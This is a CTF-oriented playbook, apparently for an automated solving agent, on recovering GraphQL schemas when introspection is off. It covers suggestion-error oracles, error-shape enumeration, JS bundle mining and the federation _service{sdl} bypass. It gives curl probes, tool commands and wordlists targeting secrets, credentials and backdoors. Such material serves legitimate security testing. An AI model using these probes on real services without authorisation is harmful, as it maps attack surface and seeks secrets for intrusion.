# Introspection-off — recovering the schema without __schema

Introspection disabled closes one channel, not the class. Three recovery
routes remain, in order of cost:

1. The **field-suggestion oracle** (`did you mean` errors) — graphql-js and
   almost every descendant leak field names through edit-distance hints.
2. **Front-end archaeology** — the app's own JS bundle contains full query
   documents; mine them.
3. **Error-shape enumeration** — status/length differences distinguish
   "field does not exist" from "exists but wrong args".

Then two situational routes: `__type` still open while `__schema` is blocked
(`introspection.md` §6), and brute-force naming against wordlists
(`wordlists.md`).

---

## 1. The field-suggestion oracle — the primary weapon

graphql-js's validator suggests up to five candidates when you query an
unknown field that is *close* to real ones (Levenshtein distance). The error
text literally names schema fields:

```bash
curl -s "$BASE/graphql" -H 'Content-Type: application/json' \
  -d '{"query":"{userss}"}'
```

```json
{"errors":[{"message":"Cannot query field \"userss\" on type \"Query\".
  Did you mean \"users\" or \"user\"?"}]}
```

Every suggestion is a confirmed real field. Automate the loop with the
repository tool:

```bash
# one probe — parse the hints from a single guess
python3 tools/web/graphql_probe.py suggest --url "$BASE/graphql" --field userss

# mapped enumeration — seed with common names, loop the oracle
python3 tools/web/graphql_probe.py map --url "$BASE/graphql" \
  --seed user,users,me,node,admin,flag,secret,query,all --max 60
```

`map` works exactly like Clairvoyance's discovery phase: it sends typo'd
names, harvests every `did you mean` hint, adds each new name back as a seed,
and stops at `--max` requests or exhaustion. The output is a real field list
without a single invented name — record it in the ledger.

### Which servers leak suggestions

| Server | Suggestion oracle |
|---|---|
| graphql-js (reference) | yes — and every wrapper that uses it (express-graphql, apollo ≤3 dev, graphql-yoga) |
| Apollo Server ≥3 prod | **off by default** in production mode; on in dev — test both |
| Graphene (Python) | yes — graphene wraps graphql-core which ports the js validator |
| graphql-java | **no** — errors name the field only, no edit-distance hints |
| HotChocolate (.NET) | yes — "did you mean" enabled unless disabled |
| graphql-ruby | **no** — "Field 'x' doesn't exist on type 'Query'" without suggestions |
| Absinthe (Elixir) | yes — "Did you mean ...?" |
| Hasura | partial — error style differs, suggests via `path`/`extensions` |
| async-graphql (Rust) | yes when debug enabled |

If the server leaks no suggestions, jump to §3 (error-shape oracle) — it is
slower but universal.

## 2. Front-end archaeology — free complete documents

The app already knows the schema. Extract its queries instead of guessing:

```bash
python3 tools/web/bundle_miner.py --url "https://$HOST/" --out /tmp/bundle
grep -rhoE "(query|mutation|subscription) +[A-Za-z_][A-Za-z0-9_]* *(\([^)]*\))? *\{[^}]{0,4000}" \
  /tmp/bundle | sort -u > /tmp/app-ops.txt
grep -rhoE "gql\`[^\`]{10,4000}\`" /tmp/bundle | sort -u >> /tmp/app-ops.txt
```

Targets inside the bundle:

- `gql` / `graphql` tagged-template literals — full operation documents.
- `useQuery(GET_USERS)` where `GET_USERS` is defined nearby — grab the const.
- Fragment definitions — they reveal field lists on types never queried whole.
- The *variables* the app passes — argument names and shapes.
- Relay-style persisted query maps (`{"id":"abc123","text":null}`) — see
  `persisted-queries.md`.

Every recovered document is a *valid* query — replay it with your own
variables first, then mutate the arguments.

## 3. Error-shape oracle — universal existence check

When suggestions are off, the validator still differentiates. Three distinct
response shapes:

```bash
# A. unknown field
{"query":"{zzzqqq}"}
# → {"errors":[{"message":"Cannot query field \"zzzqqq\" on type \"Query\"."}]}
#    HTTP 400 or 200-with-errors, body length ~110

# B. real field, missing required arg or wrong selection
{"query":"{user}"}
# → {"errors":[{"message":"Field \"user\" argument \"id\" of type \"ID!\" is required"}]}
#    different message AND different length

# C. real field queried correctly
{"query":"{user(id:1){id}}"}
# → {"data":{...}} 200
```

So one request per guessed name discriminates **exists** vs **not-exists**
by message text alone — even when both are HTTP 200. The discriminator table:

| Error contains | Meaning |
|---|---|
| `Cannot query field "X"` | X does not exist |
| `argument "a" of type "T!" is required` | field exists; learn its required args for free |
| `of type "X" must have a selection of subfields` | field exists AND returns an object — learn its return type family |
| `Expected type X, found Y` | field exists; argument type leaked |
| `Unknown type "T"` | type T does not exist (for fragment probing) |

A field that errors with "must have a selection of subfields" tells you the
return type is an object — so probe `{X{__typename}}` to confirm, then guess
subfield names against the same oracle.

### Subfield enumeration without suggestions

For an object field `user`, guessing `{user{id}}` vs `{user{zzz}}`:

- `{user{zzz}}` → `Cannot query field "zzz" on type "User"` — type name leaked!
- `{user{id}}` → valid or "cannot query" — per-name oracle, per type.

So each subfield guess both tests the name and confirms the parent type.

## 4. Wordlist-driven enumeration

`map --seed` needs starting names. Pull from `wordlists.md` — the categories
ordered by CTF hit rate:

```text
flag secret token apikey api_key admin debug internal config
user users me account profile session auth login logout
node nodes entity entities object objects
file files upload uploads document documents media asset
order orders product products item items cart
log logs audit auditlog event events
role roles permission permissions perm
key keys credential credentials password passwd hash
env config settings vars variables system
query mutation subscription service services
```

Feed them:

```bash
python3 tools/web/graphql_probe.py map --url "$BASE/graphql" \
  --seed flag,secret,token,admin,debug,user,users,me,node,file,files,log,logs,role,config,env,internal,backdoor,query,mutation \
  --max 100
```

Each `did you mean` hit is appended back as a seed — the map grows itself.

## 5. Mutation surface recovery

`did you mean` works on Mutation root too — but you can't query a mutation
root field with `query {}`. Send the guess as a mutation document:

```graphql
mutation{login}
mutation{flag}
mutation{updateUserRole}
```

Same oracle: `Cannot query field` vs `argument required` vs success. Seed
mutations: `login`, `register`, `updateUser`, `deleteUser`, `setRole`,
`createUser`, `uploadFile`, `importData`, `resetPassword`, `changePassword`,
`verifyEmail`, `promote`, `grant`, `flag`, `debug`, `exec`, `run`.

## 6. When the oracle is fully silent

Some hardened builds collapse every validation failure into a single generic
400 (`"Invalid query"`). Then:

- **The bundle is your only schema** — mine it harder (§2).
- **WebSocket/subscription channels** sometimes ship a different server
  instance where introspection still works — try `ws://$HOST/graphql` with
  `connection_init` then a `start`/`subscribe` message containing an
  introspection document (`subscriptions.md`).
- **Alt endpoints**: staging (`staging.api.`), `/graphql-devtools`,
  `/internal/graphql`, per-subgraph routes in federation (`federation.md` —
  `_service{sdl}` frequently survives when `__schema` is killed because it is
  not an introspection field).
- **Federation `_service`**: `{_service{sdl}}` returns the SDL document — the
  whole subgraph schema — and Apollo treats it as a regular resolver, so
  `disableIntrospection` middlewares never block it. This is the single most
  common "introspection off" bypass on federated deployments.
- **Server metadata**: GraphiQL/Playground/Altair pages sometimes bundle the
  schema snapshot; check the IDE page's XHR to `/graphql` for a pre-loaded
  introspection response in `window.__*`.

## 7. Ledger discipline

Record the recovery route you used — the next agent needs to know which
channel was live:

```bash
python3 tools/state.py $CHAL --hypothesis \
  "introspection off; suggestion oracle live — mapped N fields"
python3 tools/state.py $CHAL --hypothesis \
  "introspection off; _service{sdl} leaks subgraph SDL"
python3 tools/hooks.py post-probe $CHAL \
  --request 'POST /graphql {_service{sdl}}' \
  --verdict confirms --evidence-kind class --class web-graphql \
  --hypothesis-id h1 --evidence '"sdl":"type Query' --response '<excerpt>'
```

A mapped field is a *name* — not yet proof it resolves without authz. The
next step is always the direct field call.
